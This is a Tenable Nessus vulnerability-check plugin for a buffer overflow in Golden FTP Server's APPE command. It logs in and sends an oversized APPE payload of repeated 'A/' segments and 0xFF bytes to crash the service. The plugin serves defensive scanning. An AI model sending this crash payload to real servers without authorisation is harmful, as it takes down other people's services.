#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20344);
  script_version("1.17");

  script_cve_id("CVE-2005-4553");
  script_bugtraq_id(16060);
 
  script_name(english:"Golden FTP Server APPE Command Remote Overflow");
  script_summary(english:"Checks for appe command buffer overflow vulnerability in Golden FTP Server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using Golden FTP Server, a personal FTP
server for Windows. 

The version of Golden FTP Server installed on the remote host contains
a stack-based buffer overflow vulnerability that can be exploited by
an authenticated, possibly anonymous, user with a specially crafted
APPE command to crash the affected application or execute arbitrary
code on the affected host." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/12/22");
 script_cvs_date("Date: 2018/07/12 19:01:15");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:kmint21_software:golden_ftp_server");
 script_end_attributes();

 
  script_category(ACT_DENIAL); 
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2018 Tenable Network Security, Inc.");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_require_keys("ftp/login", "ftp/password");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");


port = get_ftp_port(default: 21);


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item_or_exit("ftp/login");
pass = get_kb_item_or_exit("ftp/password");


soc = open_sock_tcp(port);
if (!soc) exit(1);
if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
  close(soc);
  exit(1, "can't login with supplied FTP credentials");
}


# Make sure it's Golden FTP Server.
send(socket:soc, data: 'SYST\r\n');
s = recv_line(socket:soc, length:4096);
if ("215 WIN32" >!< s) exit(0);


# Try to exploit the flaw to crash the daemon.
evil = "APPE /";
for (i=1; i<=120; i++) evil += "A/";
c = strcat(evil, crap(data: '\xFF', length:700));
send(socket:soc, data: c + '\r\n');
s = ftp_recv_line(socket:soc);


# If we didn't get a response...
if (isnull(s)) {
  # Check whether it's truly down.
  if (service_is_dead(port: port) > 0)
   security_hole(port);

  exit(0);
}


ftp_close(socket:soc);
